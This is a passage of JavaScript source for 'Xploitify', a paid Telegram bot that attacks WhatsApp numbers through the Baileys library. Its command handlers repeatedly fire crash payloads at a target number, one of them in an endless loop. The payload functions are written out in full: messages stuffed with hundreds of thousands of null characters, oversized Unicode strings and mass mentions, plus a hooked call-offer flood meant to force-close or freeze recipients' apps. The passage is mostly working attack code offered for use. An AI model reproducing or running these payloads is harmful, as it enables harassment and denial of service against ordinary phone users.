<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ ShinyLight
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 10; i++) {
      await ATRAndroidCrash(sock, target);
      await sleep(1000);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ ShinyLight
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 3
bot.onText(/\/MagnetIos (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MagnetIos
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 7; i++) {
      await invsNewIos(target);
      await sleep(500);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MagnetIos
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 4
bot.onText(/\/ForceDarkNess (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ ForceDarkNess
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 10; i++) {
      await PaymentFC(sock, target);
      await sleep(1000);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ ForceDarkNess
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 5
bot.onText(/\/DarkLess (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ DarkLess
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 100; i++) {
      await btnStatus(target, mention);
      await sleep(2000);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ DarkLess
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 6
bot.onText(/\/Starlight (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Starlight
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 3; i++) {
      await btnStatus(target, mention);
      await sleephandler()
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Starlight
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 7
bot.onText(/\/Topsignal (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Topsignal
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 15; i++) {
      await iosX(sock, target);
      await sleephandler();
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Topsignal
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 8
bot.onText(/\/Laserbreaker (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Laserbreaker
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 20; i++) {
      await QueenSqL(target);
      await sleep(500);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Laserbreaker
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 9
bot.onText(/\/Starluxury (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Starluxury
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    while (true) {
      await SpamcallFcPermanen(sock, target);
      await sleep(1000);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Starluxury
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 10
bot.onText(/\/Relaxios (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Relaxios
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 10; i++) {
      await blankIphone13(sock, target);
      await sleep(1000);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Relaxios
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 11
bot.onText(/\/xspam (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ xspam
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 5; i++) {
      await AyunBelovedxnxx(sock, target);
      await btnStatus(target, mention);
      await sleephandler()
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ xspam
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Function Bugs
async function R9X(sock, target, mention = false) {
  for (let i = 0; i < 99; i++) {
    var R9X = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "R9X",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"R9X\",\"tower_number\":\"R9X\",\"city\":\"chindo\",\"name\":\"R9X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"R9X | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      R9X.message,
      mention
        ? {
            participant: { jid: target },
            messageId: R9X.key.id
          }
        : {}
    );
  }
}

async function FcIos(sock, target) {
  const iosxx = "\u0010";
  const iosx = "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
  
    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: yessss,
            address: korea,
            url: `https://FlavourKelra.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                }],
             }],
         }],
     });
   }

async function MakLoInpis(target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let node1 = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let node2 = node1();
    let node3 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let node4 = sock.createParticipantNodes.bind(sock);
    let node5 = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = node3(
                    node5 ? node5(msg) : encodeWAMessage(msg)
                );

                return node2.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 50000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 100; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: target,
                    id: sock.generateMessageTag(),
                    from: sock.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await sock.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try {
            await sock.chatModify({ clear: true }, target);
            console.log("SUCCES");
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log(chalk.red("Succesfully Send Forclose New"));  
}

async function CStatus(sock, target) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "\u0000".repeat(9000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                isForwarded: true,
                forwardingScore: 7205,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363395010254840@newsletter",
                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
                    serverMessageId: 1000,
                    accessibilityText: "idk"
                },
                statusAttributionType: "RESHARED_FROM_MENTION",
                contactVcard: true,
                isSampled: true,
                dissapearingMode: {
                    initiator: target,
                    initiatedByMe: true
                },
                expiration: Date.now()
            },
        }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
